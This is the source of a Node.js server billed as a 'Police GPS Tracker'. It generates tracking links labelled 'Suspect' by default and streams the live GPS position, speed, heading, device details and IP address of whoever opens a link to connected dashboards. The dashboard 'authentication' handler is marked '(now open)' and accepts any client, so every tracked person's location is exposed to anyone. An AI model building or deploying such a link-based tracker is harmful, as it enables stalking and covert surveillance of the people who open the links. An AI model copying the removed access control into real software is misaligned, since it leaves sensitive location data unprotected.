const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const { v4: uuidv4 } = require("uuid");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

// ─── Config ───────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;

// ─── In-memory store ──────────────────────────────────────────────────────────
const sessions = {};       // { sessionId: { label, positions:[], lastSeen, socketId } }
const policeClients = new Set(); // socket IDs of authenticated dashboards

// ─── Static files ─────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ─── REST: Create a tracking session ───────────────────────────────────────────
app.post("/api/session", (req, res) => {
  const { label } = req.body;

  const id = uuidv4();
  sessions[id] = { id, label: label || "Suspect", positions: [], lastSeen: null };
  console.log(`[+] Session created: ${id} (${label})`);
  
  const trackingPath = `/track/${id}`;
  
  res.json({ sessionId: id, trackingUrl: trackingPath });
});

// ─── REST: Get all sessions ─────────────────────────────────────────────────────
app.get("/api/sessions", (req, res) => {
  res.json(Object.values(sessions).map(s => ({
    id: s.id, label: s.label, lastSeen: s.lastSeen,
    positionCount: s.positions.length,
    latest: s.positions[s.positions.length - 1] || null
  })));
});

// ─── Pages ────────────────────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/track/:sessionId", (req, res) => {
  if (!sessions[req.params.sessionId])
    return res.status(404).send("Link not found.");
  res.sendFile(path.join(__dirname, "public", "track.html"));
});

app.get("/dashboard", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

// ─── Socket.IO ────────────────────────────────────────────────────────────────
io.on("connection", (socket) => {
  console.log(`[~] Socket connected: ${socket.id}`);

  // Police dashboard authentication (now open)
  socket.on("police:auth", () => {
    policeClients.add(socket.id);
    socket.emit("police:auth:ok");
    // Send current session list
    socket.emit("sessions:list", Object.values(sessions).map(s => ({
      id: s.id, label: s.label, lastSeen: s.lastSeen,
      latest: s.positions[s.positions.length - 1] || null
    })));
    console.log(`[✓] Police dashboard connected: ${socket.id}`);
  });

  // Tracker device joins a session
  socket.on("tracker:join", ({ sessionId }) => {
    if (!sessions[sessionId]) {
      socket.emit("tracker:error", "Invalid session.");
      return;
    }
    sessions[sessionId].socketId = socket.id;
    socket.sessionId = sessionId;
    socket.join(`session:${sessionId}`);
    socket.emit("tracker:joined", { label: sessions[sessionId].label });
    console.log(`[+] Tracker joined session ${sessionId}`);

    // Notify police
    broadcastToPolice("tracker:online", { sessionId, label: sessions[sessionId].label });
  });

  // Device info from tracker
  socket.on("tracker:deviceInfo", ({ sessionId, deviceInfo }) => {
    if (!sessions[sessionId]) return;
    sessions[sessionId].deviceInfo = deviceInfo;
    sessions[sessionId].ip = socket.handshake.address || socket.conn.remoteAddress;
    console.log(`[i] Device info received for ${sessionId}`);
    broadcastToPolice("device:info", { sessionId, ...deviceInfo, ip: sessions[sessionId].ip });
  });

  // Location update from tracker
  socket.on("tracker:location", ({ sessionId, lat, lng, accuracy, speed, heading, altitude, altitudeAccuracy, timestamp }) => {
    if (!sessions[sessionId]) return;

    const pos = { lat, lng, accuracy, speed, heading, altitude, altitudeAccuracy, timestamp: timestamp || Date.now() };
    sessions[sessionId].positions.push(pos);
    sessions[sessionId].lastSeen = pos.timestamp;

    // Keep last 500 positions per session
    if (sessions[sessionId].positions.length > 500)
      sessions[sessionId].positions.shift();

    console.log(`[→] ${sessions[sessionId].label}: ${lat.toFixed(5)}, ${lng.toFixed(5)} ±${Math.round(accuracy)}m`);

    // Broadcast to all police dashboards
    broadcastToPolice("location:update", {
      sessionId,
      label: sessions[sessionId].label,
      ...pos
    });
  });

  // Disconnect
  socket.on("disconnect", () => {
    policeClients.delete(socket.id);
    if (socket.sessionId) {
      broadcastToPolice("tracker:offline", { sessionId: socket.sessionId });
      console.log(`[-] Tracker disconnected: ${socket.sessionId}`);
    }
  });
});

function broadcastToPolice(event, data) {
  policeClients.forEach(id => {
    const s = io.sockets.sockets.get(id);
    if (s) s.emit(event, data);
  });
}

// ─── Start ────────────────────────────────────────────────────────────────────
server.listen(PORT, () => {
  console.log(`\n🚔 Police GPS Tracker running at http://localhost:${PORT}`);
  console.log(`   Dashboard : http://localhost:${PORT}/dashboard\n`);
});
